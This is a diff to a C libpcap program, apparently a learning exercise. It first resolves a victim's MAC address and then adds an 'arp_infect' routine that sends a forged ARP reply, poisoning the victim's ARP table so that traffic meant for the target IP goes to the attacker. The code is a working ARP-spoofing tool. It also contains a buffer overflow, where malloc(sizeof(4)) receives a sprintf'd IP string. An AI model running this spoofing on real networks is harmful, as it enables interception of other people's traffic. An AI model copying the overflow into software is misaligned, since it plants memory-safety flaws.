@@ -7,7 +7,6 @@
 
 
 /* Ethernet header */
-
 struct __attribute__((packed)) etherhdr {
 	u_char dst[ETHER_ADDR_LEN];
 	u_char src[ETHER_ADDR_LEN];
@@ -37,7 +36,7 @@ void print_mac(u_char *mac_addr){
 	}
 }
 
-void arp_broad(pcap_t *handle, u_char *mac_addr, struct in_addr *senderIP, struct in_addr *targetIP){
+u_char* arp_broad(pcap_t *handle, u_char *mac_addr, struct in_addr *senderIP, struct in_addr *targetIP){
 	u_char* packet;
 	struct etherhdr ether,*recv_ether;
 	struct arphdr arp_h,*recv_arp_h;
@@ -47,6 +46,9 @@ void arp_broad(pcap_t *handle, u_char *mac_addr, struct in_addr *senderIP, struc
 	int flag;
 	struct in_addr recv_IP;
 	u_char* recv_MAC;
+	u_char* buf;
+	u_char addr[4];
+
 	memcpy(ether.src,mac_addr,ETHER_ADDR_LEN);
 	memcpy(ether.dst,"\xff\xff\xff\xff\xff\xff",ETHER_ADDR_LEN);
 	ether.ether_type = htons(0x0806);
@@ -94,7 +96,6 @@ void arp_broad(pcap_t *handle, u_char *mac_addr, struct in_addr *senderIP, struc
 		printf("%02x ",*(packet+i));
 	}
 	printf("end\n");
-
 	while(1){
 		if(pcap_sendpacket(handle,packet,packet_len) == 0)
 			break;
@@ -118,34 +119,36 @@ void arp_broad(pcap_t *handle, u_char *mac_addr, struct in_addr *senderIP, struc
 		}
 
 
-	for(int i=0;i<sizeof(ether)+sizeof(arp_h);i++){
-		if(i != 0 && i%16 == 0)
-			printf("\n");
-		printf("%02x ",*(recv_packet+i));
-	}
-	printf("end\n");
 		printf("\n[-] success to receive packet!\n");
+		for(int i=0;i<sizeof(ether)+sizeof(arp_h);i++){
+			if(i != 0 && i%16 == 0)
+				printf("\n");
+			printf("%02x ",*(recv_packet+i));
+		}
+		printf("end\n");
 		recv_ether = (struct etherhdr*)recv_packet;
 		if(htons(recv_ether->ether_type) != 0x0806){
-			printf("[-] reply ether type is not arp!\n");
-			printf("ether type : 0x%x\n",ntohs(recv_ether->ether_type));
+//			printf("[-] reply ether type is not arp!\n");
+//			printf("ether type : 0x%x\n",ntohs(recv_ether->ether_type));
 			continue;
 		}
 		recv_arp_h = (struct arphdr*)(recv_packet + sizeof(struct etherhdr));
 		
 		if(htons(recv_arp_h->htype) != 1 || htons(recv_arp_h->ptype) != 0x0800 || ntohs(recv_arp_h->oper) != ARP_REPLY){
-			printf("[-] this packet is not arp reply packet!\n");
-			printf("hardware type : 0x%x\nARP type : 0x%x // ARP REPLY : 0x%x\n",ntohs(recv_arp_h->htype),ntohs(recv_arp_h->oper),ARP_REPLY);
+//			printf("[-] this packet is not arp reply packet!\n");
+//			printf("hardware type : 0x%x\nARP type : 0x%x // ARP REPLY : 0x%x\n",ntohs(recv_arp_h->htype),ntohs(recv_arp_h->oper),ARP_REPLY);
 			continue;
 		}
-
-		printf("ARP type : 0x%x // ARP REPLY : 0x%x\n",ntohs(recv_arp_h->oper),ARP_REPLY);
-		if(memcmp(recv_arp_h->spa,senderIP,sizeof(senderIP))){
-			printf("[-] senderIP not match!\n");
-			printf("\t[+] received arp header IP : ");
-			for(int i=0;i<4;i++) printf("%02x", recv_arp_h->spa[i]); printf("\n");
-			printf("\t[+] sender IP : ");
-			printf("%x\n",htonl(senderIP->s_addr));
+		buf = (u_char*)malloc(sizeof(4));
+		sprintf(buf,"%d.%d.%d.%d",recv_arp_h->spa[0],recv_arp_h->spa[1],recv_arp_h->spa[2],recv_arp_h->spa[3]);
+		inet_pton(AF_INET,buf,&recv_IP.s_addr);
+		free(buf);
+		if(memcmp(&recv_IP,targetIP,sizeof(recv_IP))){
+			printf("[-] IP not match!\n");
+			printf("\t[+] received arp sender IP : ");
+			printf("%x\n",ntohl(recv_IP.s_addr));
+			printf("\t[+] target IP : ");
+			printf("%x\n",htonl(targetIP->s_addr));
 			continue;
 		}
 		
@@ -153,10 +156,79 @@ void arp_broad(pcap_t *handle, u_char *mac_addr, struct in_addr *senderIP, struc
 		printf("\n[+] result\n");
 		printf("\t[-] reply IP : %s\n",inet_ntoa(recv_IP));
 		printf("\t[-] reply MAC : "); print_mac(recv_arp_h->sha);
-		printf("\nDone!\n");
-		
-		break;
+	
+		printf("\t[-] Done!\n\n");
+		return recv_arp_h->sha;
 	}
+}
+void arp_infect(pcap_t *handle, u_char *my_mac, u_char *sender_mac, struct in_addr *senderIP, struct in_addr *targetIP){
+	u_char* packet;
+	struct etherhdr ether,*recv_ether;
+	struct arphdr arp_h,*recv_arp_h;
+	u_char* recv_packet;
+	struct pcap_pkthdr *header;
+	int packet_len;
+	int flag;
+	struct in_addr recv_IP;
+	u_char* recv_MAC;
+	u_char* buf;
+	u_char addr[4];
+
+	memcpy(ether.src,my_mac,ETHER_ADDR_LEN);
+	memcpy(ether.dst,sender_mac,ETHER_ADDR_LEN);
+	ether.ether_type = htons(0x0806);
+	printf("\n\t[+] Ethernet header\n");
+	printf("\t\t[-] Destination MAC : ");
+	print_mac(ether.dst);
+	printf("\t\t[-] Source MAC : ");
+	print_mac(ether.src);
+	printf("\t\t[-] ethernet type : 0x%x\n",ntohs(ether.ether_type));
+
+	arp_h.htype = htons(0x0001);
+	arp_h.ptype = htons(ETHERTYPE_IP);
+	arp_h.hlen = ETHER_ADDR_LEN;
+	arp_h.plen = 4;
+	arp_h.oper = htons(ARP_REPLY);
+	memcpy(arp_h.sha,my_mac,sizeof(arp_h.sha));
+	memcpy(arp_h.spa,targetIP,sizeof(arp_h.spa));
+	memcpy(arp_h.tha,sender_mac,sizeof(arp_h.tha));
+	memcpy(arp_h.tpa,senderIP,sizeof(arp_h.tpa));
+
+	printf("\n\t[+] IP information\n");
+	printf("\t\tsenderIP : %s // hex : 0x%x\n",inet_ntoa(*senderIP),htonl(senderIP->s_addr));
+	printf("\t\ttargetIP : %s // hex : 0x%x\n",inet_ntoa(*targetIP),htonl(targetIP->s_addr));
+
+	printf("\n\n\t[+] ARP header information\n");
+	printf("\t\thtype : 0x%x\n",ntohs(arp_h.htype));
+	printf("\t\tptype : 0x%x\n",ntohs(arp_h.ptype));
+	printf("\t\thlen : %d\n",arp_h.hlen);
+	printf("\t\tplen : %d\n",arp_h.plen);
+	printf("\t\toper : %x\n",ntohs(arp_h.oper));
+	printf("\t\tsender mac : "); print_mac(arp_h.sha);
+	printf("\t\tsender IP : 0x"); for(int i=0;i<4;i++) printf("%02x",arp_h.spa[i]); printf("\n");
+	printf("\t\ttarget MAC : "); print_mac(arp_h.tha);
+	printf("\t\ttarget IP : 0x"); for(int i=0;i<4;i++) printf("%02x",arp_h.tpa[i]); printf("\n");
+
+	packet = (u_char*)malloc(sizeof(ether)+sizeof(arp_h));
+	memcpy(packet,&ether,sizeof(ether));
+	memcpy(packet+sizeof(ether),&arp_h,sizeof(arp_h));
+	packet_len = sizeof(ether) + sizeof(arp_h);
+
+	printf("\n[+] packet to send\n");
+	for(int i=0;i<sizeof(ether)+sizeof(arp_h);i++){
+		if(i != 0 && i%16 == 0)
+			printf("\n");
+		printf("%02x ",*(packet+i));
+	}
+	printf("end\n");
+
+	while(1){
+		if(pcap_sendpacket(handle,packet,packet_len) == 0)
+			break;
+	}
+
+	printf("\n[+] arp request completed!\n\n");
+
 }
 
 int main(int argc, char* argv[])
@@ -169,6 +241,7 @@ int main(int argc, char* argv[])
 	struct in_addr senderIP, targetIP, myIP;
 	u_char addr[4];
 	u_char *buf;
+	u_char *sender_mac;
 
 	struct in_addr in;
 
@@ -203,8 +276,11 @@ int main(int argc, char* argv[])
 		printf("[+] cannot open device!\n");
 		exit(1);
 	}
-	//arp_broad(handle,my_mac,&senderIP,&targetIP);
-	arp_broad(handle,my_mac,&myIP,&senderIP);
+	sender_mac = arp_broad(handle,my_mac,&myIP,&senderIP);
+	printf("[+] sender MAC : "); print_mac(sender_mac);
+
+	printf("\n[+] infect arp table...\n");
+	arp_infect(handle,my_mac,sender_mac,&senderIP,&targetIP);
 	printf("\n[+] Done!\n");		
 	return 0;
 }
